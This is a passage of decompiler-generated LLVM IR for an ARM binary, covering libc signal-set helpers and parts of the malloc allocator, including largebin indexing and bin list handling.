  %v3_13260 = add i32 %v4_13254, %v0_13250
  %v4_13260 = inttoptr i32 %v3_13260 to i32*
  store i32 22, i32* %v4_13260, align 4
  %v0_132c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_13268:                               ; preds = %dec_label_pc_13244
  %v2_13268 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13268, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13270 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13270, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_13280 = call i32 @__sigaddset()
  %v0_13288 = load i32, i32* @r5, align 4
  store i32 %v0_13288, i32* %r1.global-to-local, align 4
  %v0_1328c = load i32, i32* @r6, align 4
  %v2_1328c = add i32 %v0_1328c, 12128
  %v2_13290 = call i32 @__GI___sigismember(i32 %v2_1328c, i32 %v0_13288)
  store i32 %v2_13268, i32* %r1.global-to-local, align 4
  %v0_132a4 = load i32, i32* @r5, align 4
  %v3_132b0 = call i32 @__libc_sigaction(i32 %v0_132a4, i32 %v2_13268, i32 %v2_13228)
  %v1_132b4 = icmp slt i32 %v3_132b0, 0
  br i1 %v1_132b4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_13268
  %v5_132b8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_132b8, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_13268
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1324c, %bb32
  %v0_132c0 = phi i32 [ %v5_132b8, %bb31 ], [ %v0_132c0.pre, %dec_label_pc_1324c ], [ -1, %bb32 ]
  %v2_132c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_132c8, i32* @r4, align 4
  store i32 %v6_13218, i32* @r5, align 4
  store i32 %v9_13218, i32* @r6, align 4
  ret i32 %v0_132c0

; uselistorder directives
  uselistorder i32 %v2_13268, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1324c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_132dc = add i32 %arg2, -1
  %v3_132e0 = udiv i32 %v1_132dc, 32
  %v4_132e4 = mul nuw nsw i32 %v3_132e0, 4
  %v5_132e4 = add i32 %v4_132e4, %arg1
  %v6_132e4 = inttoptr i32 %v5_132e4 to i32*
  %v7_132e4 = load i32, i32* %v6_132e4, align 4
  %v1_132e8 = urem i32 %v1_132dc, 32
  %v7_132f0 = shl i32 1, %v1_132e8
  %v8_132f0 = and i32 %v7_132e4, %v7_132f0
  %v10_132f0 = icmp ne i32 %v8_132f0, 0
  %. = zext i1 %v10_132f0 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_132dc, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_13300 = load i32, i32* @r1, align 4
  %v1_13300 = add i32 %v0_13300, -1
  %v3_13304 = udiv i32 %v1_13300, 32
  %v0_13308 = load i32, i32* @r0, align 4
  %v4_13308 = mul nuw nsw i32 %v3_13304, 4
  %v5_13308 = add i32 %v0_13308, %v4_13308
  %v6_13308 = inttoptr i32 %v5_13308 to i32*
  %v7_13308 = load i32, i32* %v6_13308, align 4
  %v1_1330c = urem i32 %v1_13300, 32
  %v7_13314 = shl i32 1, %v1_1330c
  %v8_13314 = or i32 %v7_13308, %v7_13314
  store i32 %v8_13314, i32* %v6_13308, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13300, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13324 = add i32 %arg2, -1
  %v3_13328 = udiv i32 %v1_13324, 32
  %v4_1332c = mul nuw nsw i32 %v3_13328, 4
  %v5_1332c = add i32 %v4_1332c, %arg1
  %v6_1332c = inttoptr i32 %v5_1332c to i32*
  %v7_1332c = load i32, i32* %v6_1332c, align 4
  %v1_13330 = urem i32 %v1_13324, 32
  %tmp = shl i32 -1, %v1_13330
  %v8_13338 = add i32 %tmp, -1
  %v9_13338 = and i32 %v7_1332c, %v8_13338
  store i32 %v9_13338, i32* %v6_1332c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13324, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_13348 = udiv i32 %arg1, 256
  store i32 %v3_13348, i32* %r1.global-to-local, align 4
  %v2_1334c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_1334c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_13358 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1334c, i32 %v0_13358)
  %v0_1335c = load i32, i32* %r1.global-to-local, align 4
  %v1_1335c = add i32 %v0_1335c, 1048320
  %v3_13360 = udiv i32 %v1_1335c, 65536
  %v1_13364 = and i32 %v3_13360, 8
  %v6_13368 = shl i32 %v0_1335c, %v1_13364
  %v1_1336c = add i32 %v6_13368, 520192
  %v3_13370 = udiv i32 %v1_1336c, 65536
  %v1_13374 = and i32 %v3_13370, 4
  %v6_13378 = shl i32 %v6_13368, %v1_13374
  %v1_1337c = add i32 %v6_13378, 245760
  %v3_13380 = udiv i32 %v1_1337c, 65536
  %v1_13384 = and i32 %v3_13380, 2
  %v6_13388 = shl i32 %v6_13378, %v1_13384
  store i32 %v6_13388, i32* %r1.global-to-local, align 4
  %v1_1338c = sub nsw i32 13, %v1_13364
  %v2_13390 = sub nsw i32 %v1_1338c, %v1_13374
  %v3_13394 = udiv i32 %v6_13388, 32768
  %v4_13394 = sub nuw nsw i32 -1, %v3_13394
  %v4_13398 = udiv i32 %v6_13388, 16384
  %v5_13398 = and i32 %v4_13398, %v4_13394
  %v2_1339c = sub nsw i32 %v2_13390, %v1_13384
  %v2_133a0 = add nsw i32 %v2_1339c, %v5_13398
  %v1_133a4 = add nsw i32 %v2_133a0, 6
  %v0_133a8 = load i32, i32* %ip.global-to-local, align 4
  %v6_133a8 = lshr i32 %v0_133a8, %v1_133a4
  %v3_133ac = mul nsw i32 %v2_133a0, 4
  %v1_133b0 = add nsw i32 %v3_133ac, 32
  %v1_133b4 = urem i32 %v6_133a8, 4
  %v2_133b8 = or i32 %v1_133b4, %v1_133b0
  ret i32 %v2_133b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_133c0 = load i32, i32* @r4, align 4
  %v6_133c0 = load i32, i32* @r5, align 4
  %v9_133c0 = load i32, i32* @r6, align 4
  %v12_133c0 = load i32, i32* @r7, align 4
  %v15_133c0 = load i32, i32* @r8, align 4
  %v18_133c0 = load i32, i32* @sb, align 4
  %v21_133c0 = load i32, i32* @sl, align 4
  %v24_133c0 = load i32, i32* @fp, align 4
  %v27_133c0 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r1.global-to-local, align 4
  %v4_133d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 108) to i32*), align 4
  store i32 %v4_133d4, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_133e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 68) to i32*), align 4
  store i32 %v4_133e0, i32* %r1.global-to-local, align 4
  %v0_133e4 = load i32, i32* @r0, align 4
  store i32 %v0_133e4, i32* @r5, align 4
  store i32 %v4_133d4, i32* %r2.global-to-local, align 4
  %v2_133ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_133ec, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %ip.global-to-local, align 4
  %v4_133f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), align 4
  store i32 %v4_133f8, i32* %ip.global-to-local, align 4
  store i32 78852, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_133f8)
  %v0_13404 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13404, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r1, align 4
  %v4_13410 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 16) to i32*), align 4
  store i32 %v4_13410, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1341c.573 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13410)
  %v0_1341c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1341c, -32
  br i1 %tmp, label %dec_label_pc_13440, label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %entry
  store i32 65436, i32* %r2.global-to-local, align 4
  %v0_13428 = call i32 @__aeabi_read_tp()
  store i32 %v0_13428, i32* %r0.global-to-local, align 4
  %v3_1342c = load i16, i16* @global_var_233d0.483, align 2
  %v4_1342c = sext i16 %v3_1342c to i32
  store i32 %v4_1342c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_13438 = add i32 %v4_1342c, %v0_13428
  %v4_13438 = inttoptr i32 %v3_13438 to i32*
  store i32 12, i32* %v4_13438, align 4
  br label %dec_label_pc_13cc4

dec_label_pc_13440:                               ; preds = %entry
  %v1_13440 = add i32 %v0_1341c, 11
  store i32 %v1_13440, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v2_1344c = icmp ugt i32 %v1_13440, 14
  %v7_1344c = icmp eq i32 %v1_13440, 15
  %v2_13450 = xor i1 %v7_1344c, true
  %v3_13450 = and i1 %v2_1344c, %v2_13450
  br i1 %v3_13450, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_13440
  %v5_13450 = and i32 %v1_13440, -8
  store i32 %v5_13450, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_13440, %bb
  %v4_13454 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13454, i32* @r0, align 4
  %v1_13458 = inttoptr i32 %v4_13454 to i32*
  %v2_13458 = load i32, i32* %v1_13458, align 4
  store i32 %v2_13458, i32* @r4, align 4
  %v2_1345c = xor i1 %v2_1344c, true
  %v3_1345c = or i1 %v7_1344c, %v2_1345c
  br i1 %v3_1345c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_13460 = urem i32 %v2_13458, 2
  %v2_13460 = icmp eq i32 %v1_13460, 0
  br i1 %v2_13460, label %dec_label_pc_13468, label %dec_label_pc_13478

dec_label_pc_13468:                               ; preds = %bb143
  %v2_13468 = icmp eq i32 %v2_13458, 0
  br i1 %v2_13468, label %dec_label_pc_13470, label %dec_label_pc_13854

dec_label_pc_13470:                               ; preds = %dec_label_pc_13468
  %v0_13470 = call i32 @__malloc_consolidate()
  store i32 %v0_13470, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13854

dec_label_pc_13478:                               ; preds = %bb143
  %v0_13478 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_13478, %v2_13458
  br i1 %tmp204, label %dec_label_pc_134a0, label %dec_label_pc_13480

dec_label_pc_13480:                               ; preds = %dec_label_pc_13478
  %v1_13480 = add i32 %v4_13454, -4
  store i32 %v1_13480, i32* %r1.global-to-local, align 4
  %v3_13484 = udiv i32 %v0_13478, 8
  store i32 %v3_13484, i32* %r2.global-to-local, align 4
  %v4_13488 = mul nuw i32 %v3_13484, 4
  %v5_13488 = add i32 %v4_13488, %v1_13480
  %v6_13488 = inttoptr i32 %v5_13488 to i32*
  %v7_13488 = load i32, i32* %v6_13488, align 4
  store i32 %v7_13488, i32* %r0.global-to-local, align 4
  %v2_1348c = icmp eq i32 %v7_13488, 0
  br i1 %v2_1348c, label %dec_label_pc_134a0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13480
  %v2_13490 = add i32 %v7_13488, 8
  %v3_13490 = inttoptr i32 %v2_13490 to i32*
  %v4_13490 = load i32, i32* %v3_13490, align 4
  store i32 %v4_13490, i32* %r3.global-to-local, align 4
  store i32 %v2_13490, i32* %r0.global-to-local, align 4
  store i32 %v2_13490, i32* %r4.global-to-local, align 4
  store i32 %v4_13490, i32* %v6_13488, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_134a0:                               ; preds = %dec_label_pc_13480, %dec_label_pc_13478
  %tmp205 = icmp ugt i32 %v0_13478, 255
  br i1 %tmp205, label %dec_label_pc_134f0, label %dec_label_pc_134a8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_134a0
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_134b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  %v3_134b4 = udiv i32 %v0_13478, 8
  store i32 %v3_134b4, i32* @r7, align 4
  %v4_134b8 = mul nuw i32 %v3_134b4, 8
  %v5_134b8 = add i32 %v4_134b0, %v4_134b8
  store i32 %v5_134b8, i32* %r3.global-to-local, align 4
  %v1_134bc = add i32 %v5_134b8, 44
  store i32 %v1_134bc, i32* %ip.global-to-local, align 4
  %v1_134c0 = add i32 %v5_134b8, 56
  %v2_134c0 = inttoptr i32 %v1_134c0 to i32*
  %v3_134c0 = load i32, i32* %v2_134c0, align 4
  store i32 %v3_134c0, i32* %r0.global-to-local, align 4
  %v9_134c4 = icmp eq i32 %v3_134c0, %v1_134bc
  br i1 %v9_134c4, label %dec_label_pc_13650, label %dec_label_pc_134cc

dec_label_pc_134cc:                               ; preds = %dec_label_pc_134a8
  %v2_134cc = add i32 %v3_134c0, %v0_13478
  store i32 %v2_134cc, i32* %r3.global-to-local, align 4
  %v1_134d0 = add i32 %v2_134cc, 4
  %v2_134d0 = inttoptr i32 %v1_134d0 to i32*
  %v3_134d0 = load i32, i32* %v2_134d0, align 4
  store i32 %v3_134d0, i32* %r2.global-to-local, align 4
  %v1_134d4 = add i32 %v3_134c0, 12
  %v2_134d4 = inttoptr i32 %v1_134d4 to i32*
  %v3_134d4 = load i32, i32* %v2_134d4, align 4
  store i32 %v3_134d4, i32* %r1.global-to-local, align 4
  %v1_134d8 = or i32 %v3_134d0, 1
  store i32 %v1_134d8, i32* %r2.global-to-local, align 4
  %v1_134dc = add i32 %v3_134c0, 8
  store i32 %v1_134dc, i32* %r4.global-to-local, align 4
  store i32 %v1_134d8, i32* %v2_134d0, align 4
  %v0_134e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_134e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_134e4 = add i32 %v1_134e4, 8
  %v3_134e4 = inttoptr i32 %v2_134e4 to i32*
  store i32 %v0_134e4, i32* %v3_134e4, align 4
  %v0_134e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_134e8 = load i32, i32* %ip.global-to-local, align 4
  %v2_134e8 = add i32 %v1_134e8, 12
  %v3_134e8 = inttoptr i32 %v2_134e8 to i32*
  store i32 %v0_134e8, i32* %v3_134e8, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_134f0:                               ; preds = %dec_label_pc_134a0
  store i32 %v0_13478, i32* %r0.global-to-local, align 4
  %v1_134f4 = call i32 @__malloc_largebin_index(i32 %v0_13478)
  store i32 %v1_134f4, i32* %r0.global-to-local, align 4
  %v0_134f8 = load i32, i32* @r4, align 4
  %v1_134f8 = and i32 %v0_134f8, 2
  %v2_134f8 = icmp eq i32 %v1_134f8, 0
  store i32 %v1_134f4, i32* @r7, align 4
  br i1 %v2_134f8, label %dec_label_pc_13650, label %dec_label_pc_13504

dec_label_pc_13504:                               ; preds = %dec_label_pc_134f0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r1.global-to-local, align 4
  %v4_1350c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_1350c, i32* @r0, align 4
  %v0_13510 = call i32 @__malloc_consolidate()
  store i32 %v0_13510, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13650

dec_label_pc_13518:                               ; preds = %dec_label_pc_13664
  %v1_13518 = add i32 %v3_13664, 4
  %v2_13518 = inttoptr i32 %v1_13518 to i32*
  %v3_13518 = load i32, i32* %v2_13518, align 4
  store i32 %v3_13518, i32* %r3.global-to-local, align 4
  %v0_1351c = load i32, i32* @sl, align 4
  %v1_13520 = and i32 %v3_13518, -4
  store i32 %v1_13520, i32* %r4.global-to-local, align 4
  %v1_13524 = add i32 %v3_13664, 12
  %v2_13524 = inttoptr i32 %v1_13524 to i32*
  %v3_13524 = load i32, i32* %v2_13524, align 4
  store i32 %v3_13524, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_1351c, 255
  br i1 %tmp206, label %dec_label_pc_13580, label %dec_label_pc_1352c

dec_label_pc_1352c:                               ; preds = %dec_label_pc_13518
  %v9_1352c = icmp eq i32 %v3_13524, %v0_13584
  br i1 %v9_1352c, label %dec_label_pc_13534, label %dec_label_pc_13580

dec_label_pc_13534:                               ; preds = %dec_label_pc_1352c
  %v0_13534 = load i32, i32* @sb, align 4
  %v1_13534 = add i32 %v0_13534, 48
  %v2_13534 = inttoptr i32 %v1_13534 to i32*
  %v3_13534 = load i32, i32* %v2_13534, align 4
  store i32 %v3_13534, i32* %r3.global-to-local, align 4
  %v9_13538 = icmp eq i32 %v3_13664, %v3_13534
  br i1 %v9_13538, label %dec_label_pc_13540, label %dec_label_pc_13580

dec_label_pc_13540:                               ; preds = %dec_label_pc_13534
  %v1_13540 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_13520, %v1_13540
  br i1 %tmp207, label %dec_label_pc_13548, label %dec_label_pc_13580

dec_label_pc_13548:                               ; preds = %dec_label_pc_13540
  %v2_13548 = sub i32 %v1_13520, %v0_1351c
  store i32 %v2_13548, i32* %r2.global-to-local, align 4
  %v2_1354c = add i32 %v0_1351c, %v3_13664
  store i32 %v2_1354c, i32* %r3.global-to-local, align 4
  %v1_13550 = or i32 %v0_1351c, 1
  store i32 %v1_13550, i32* %r0.global-to-local, align 4
  %v1_13554 = or i32 %v2_13548, 1
  store i32 %v1_13554, i32* %r1.global-to-local, align 4
  %v1_13558 = add i32 %v3_13664, 8
  store i32 %v1_13558, i32* %r4.global-to-local, align 4
  %v2_1355c = add i32 %v0_13584, 8
  %v3_1355c = inttoptr i32 %v2_1355c to i32*
  store i32 %v2_1354c, i32* %v3_1355c, align 4
  %v0_13560 = load i32, i32* %r3.global-to-local, align 4
  %v1_13560 = load i32, i32* %ip.global-to-local, align 4
  %v2_13560 = add i32 %v1_13560, 12
  %v3_13560 = inttoptr i32 %v2_13560 to i32*
  store i32 %v0_13560, i32* %v3_13560, align 4
  %v0_13564 = load i32, i32* %r0.global-to-local, align 4
  %v1_13564 = load i32, i32* @r6, align 4
  %v2_13564 = add i32 %v1_13564, 4
  %v3_13564 = inttoptr i32 %v2_13564 to i32*
  store i32 %v0_13564, i32* %v3_13564, align 4
  %v0_13568 = load i32, i32* %r3.global-to-local, align 4
  %v1_13568 = load i32, i32* @sb, align 4
  %v2_13568 = add i32 %v1_13568, 48
  %v3_13568 = inttoptr i32 %v2_13568 to i32*
  store i32 %v0_13568, i32* %v3_13568, align 4
  %v0_1356c = load i32, i32* %r2.global-to-local, align 4
  %v1_1356c = load i32, i32* %r3.global-to-local, align 4
  %v3_1356c = add i32 %v1_1356c, %v0_1356c
  %v4_1356c = inttoptr i32 %v3_1356c to i32*
  store i32 %v0_1356c, i32* %v4_1356c, align 4
  %v0_13570 = load i32, i32* %r1.global-to-local, align 4
  %v1_13570 = load i32, i32* %r3.global-to-local, align 4
  %v2_13570 = add i32 %v1_13570, 4
  %v3_13570 = inttoptr i32 %v2_13570 to i32*
  store i32 %v0_13570, i32* %v3_13570, align 4
  %v0_13574 = load i32, i32* %ip.global-to-local, align 4
  %v1_13574 = load i32, i32* %r3.global-to-local, align 4
  %v2_13574 = add i32 %v1_13574, 12
  %v3_13574 = inttoptr i32 %v2_13574 to i32*
  store i32 %v0_13574, i32* %v3_13574, align 4
  %v0_13578 = load i32, i32* %ip.global-to-local, align 4
  %v1_13578 = load i32, i32* %r3.global-to-local, align 4
  %v2_13578 = add i32 %v1_13578, 8
  %v3_13578 = inttoptr i32 %v2_13578 to i32*
  store i32 %v0_13578, i32* %v3_13578, align 4
  br label %dec_label_pc_13ca8

dec_label_pc_13580:                               ; preds = %dec_label_pc_13540, %dec_label_pc_13534, %dec_label_pc_1352c, %dec_label_pc_13518
  %v9_13580 = icmp eq i32 %v1_13520, %v0_1351c
  %v2_13584 = add i32 %v3_13524, 8
  %v3_13584 = inttoptr i32 %v2_13584 to i32*
  store i32 %v0_13584, i32* %v3_13584, align 4
  %v0_13588 = load i32, i32* %ip.global-to-local, align 4
  %v1_13588 = load i32, i32* %r5.global-to-local, align 4
  %v2_13588 = add i32 %v1_13588, 12
  %v3_13588 = inttoptr i32 %v2_13588 to i32*
  store i32 %v0_13588, i32* %v3_13588, align 4
  br i1 %v9_13580, label %dec_label_pc_136e0.loopexit, label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13580
  %v0_1359c = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_1359c, 255
  br i1 %tmp208, label %dec_label_pc_135c0, label %dec_label_pc_135a4

dec_label_pc_135a4:                               ; preds = %dec_label_pc_1359c
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v1_135a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_135a8 = add i32 %v1_135a8, ptrtoint (i32* @global_var_23378.488 to i32)
  %v3_135a8 = inttoptr i32 %v2_135a8 to i32*
  %v4_135a8 = load i32, i32* %v3_135a8, align 4
  %v3_135ac = udiv i32 %v0_1359c, 8
  store i32 %v3_135ac, i32* %r0.global-to-local, align 4
  %v4_135b0 = mul nuw i32 %v3_135ac, 8
  %v5_135b0 = add i32 %v4_135a8, %v4_135b0
  store i32 %v5_135b0, i32* %r3.global-to-local, align 4
  %v1_135b4 = add i32 %v5_135b0, 44
  store i32 %v1_135b4, i32* %ip.global-to-local, align 4
  %v1_135b8 = add i32 %v5_135b0, 52
  %v2_135b8 = inttoptr i32 %v1_135b8 to i32*
  %v3_135b8 = load i32, i32* %v2_135b8, align 4
  store i32 %v3_135b8, i32* @lr, align 4
  br label %dec_label_pc_13618

dec_label_pc_135c0:                               ; preds = %dec_label_pc_1359c
  store i32 %v0_1359c, i32* %r0.global-to-local, align 4
  %v1_135c4 = call i32 @__malloc_largebin_index(i32 %v0_1359c)
  store i32 %v1_135c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %ip.global-to-local, align 4
  %v1_135cc = load i32, i32* %r8.global-to-local, align 4
  %v2_135cc = add i32 %v1_135cc, ptrtoint (i32* @global_var_23378.488 to i32)
  %v3_135cc = inttoptr i32 %v2_135cc to i32*
  %v4_135cc = load i32, i32* %v3_135cc, align 4
  %v4_135d0 = mul i32 %v1_135c4, 8
  %v5_135d0 = add i32 %v4_135cc, %v4_135d0
  store i32 %v5_135d0, i32* %r3.global-to-local, align 4
  %v1_135d4 = add i32 %v5_135d0, 44
  store i32 %v1_135d4, i32* %ip.global-to-local, align 4
  %v1_135d8 = add i32 %v5_135d0, 52
  %v2_135d8 = inttoptr i32 %v1_135d8 to i32*
  %v3_135d8 = load i32, i32* %v2_135d8, align 4
  store i32 %v3_135d8, i32* @lr, align 4
  %v9_135dc = icmp eq i32 %v3_135d8, %v1_135d4
  br i1 %v9_135dc, label %dec_label_pc_13618, label %dec_label_pc_135e4

dec_label_pc_135e4:                               ; preds = %dec_label_pc_135c0
  %v1_135e4 = add i32 %v5_135d0, 56
  %v2_135e4 = inttoptr i32 %v1_135e4 to i32*
  %v3_135e4 = load i32, i32* %v2_135e4, align 4
  store i32 %v3_135e4, i32* %r1.global-to-local, align 4
  %v1_135e8 = add i32 %v3_135e4, 4
  %v2_135e8 = inttoptr i32 %v1_135e8 to i32*
  %v3_135e8 = load i32, i32* %v2_135e8, align 4
  store i32 %v3_135e8, i32* %r3.global-to-local, align 4
  %v0_135ec = load i32, i32* %r4.global-to-local, align 4
  %v3_135ec = icmp ult i32 %v0_135ec, %v3_135e8
  br i1 %v3_135ec, label %.thread, label %dec_label_pc_13608.preheader

.thread:                                          ; preds = %dec_label_pc_135e4
  store i32 %v1_135d4, i32* @lr, align 4
  store i32 %v3_135e4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13618

dec_label_pc_13608.preheader:                     ; preds = %dec_label_pc_135e4
  %v2_135f4 = or i32 %v0_135ec, 1
  store i32 %v2_135f4, i32* %r2.global-to-local, align 4
  %v1_13608182 = add i32 %v3_135d8, 4
  %v2_13608183 = inttoptr i32 %v1_13608182 to i32*
  %v3_13608184 = load i32, i32* %v2_13608183, align 4
  store i32 %v3_13608184, i32* %r3.global-to-local, align 4
  %v3_1360c186 = icmp ult i32 %v2_135f4, %v3_13608184
  br i1 %v3_1360c186, label %dec_label_pc_13604, label %dec_label_pc_13614

dec_label_pc_13604:                               ; preds = %dec_label_pc_13608.preheader, %dec_label_pc_13604
  %v0_13614187 = phi i32 [ %v3_13604, %dec_label_pc_13604 ], [ %v3_135d8, %dec_label_pc_13608.preheader ]
  %v1_13604 = add i32 %v0_13614187, 8
  %v2_13604 = inttoptr i32 %v1_13604 to i32*
  %v3_13604 = load i32, i32* %v2_13604, align 4
  store i32 %v3_13604, i32* @lr, align 4
  %v1_13608 = add i32 %v3_13604, 4
  %v2_13608 = inttoptr i32 %v1_13608 to i32*
  %v3_13608 = load i32, i32* %v2_13608, align 4
  store i32 %v3_13608, i32* %r3.global-to-local, align 4
  %v3_1360c = icmp ult i32 %v2_135f4, %v3_13608
  br i1 %v3_1360c, label %dec_label_pc_13604, label %dec_label_pc_13614

dec_label_pc_13614:                               ; preds = %dec_label_pc_13604, %dec_label_pc_13608.preheader
  %v0_13614.lcssa = phi i32 [ %v3_135d8, %dec_label_pc_13608.preheader ], [ %v3_13604, %dec_label_pc_13604 ]
  %v1_13614 = add i32 %v0_13614.lcssa, 12
  %v2_13614 = inttoptr i32 %v1_13614 to i32*
  %v3_13614 = load i32, i32* %v2_13614, align 4
  store i32 %v3_13614, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13618

dec_label_pc_13618:                               ; preds = %.thread, %dec_label_pc_135c0, %dec_label_pc_135a4, %dec_label_pc_13614
  %v0_13638 = phi i32 [ %v1_135d4, %dec_label_pc_135c0 ], [ %v1_135b4, %dec_label_pc_135a4 ], [ %v3_13614, %dec_label_pc_13614 ], [ %v3_135e4, %.thread ]
  %v0_1362c = phi i32 [ %v1_135c4, %dec_label_pc_135c0 ], [ %v3_135ac, %dec_label_pc_135a4 ], [ %v1_135c4, %dec_label_pc_13614 ], [ %v1_135c4, %.thread ]
  %v1_1361c = phi i32 [ %v1_135cc, %dec_label_pc_135c0 ], [ %v1_135a8, %dec_label_pc_135a4 ], [ %v1_135cc, %dec_label_pc_13614 ], [ %v1_135cc, %.thread ]
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v2_1361c = add i32 %v1_1361c, ptrtoint (i32* @global_var_23378.488 to i32)
  %v3_1361c = inttoptr i32 %v2_1361c to i32*
  %v4_1361c = load i32, i32* %v3_1361c, align 4
  %v3_13620 = sdiv i32 %v0_1362c, 32
  store i32 %v3_13620, i32* %r3.global-to-local, align 4
  %v4_13624 = mul nsw i32 %v3_13620, 4
  %v5_13624 = add i32 %v4_1361c, %v4_13624
  store i32 %v5_13624, i32* %r1.global-to-local, align 4
  %v1_13628 = add i32 %v5_13624, 820
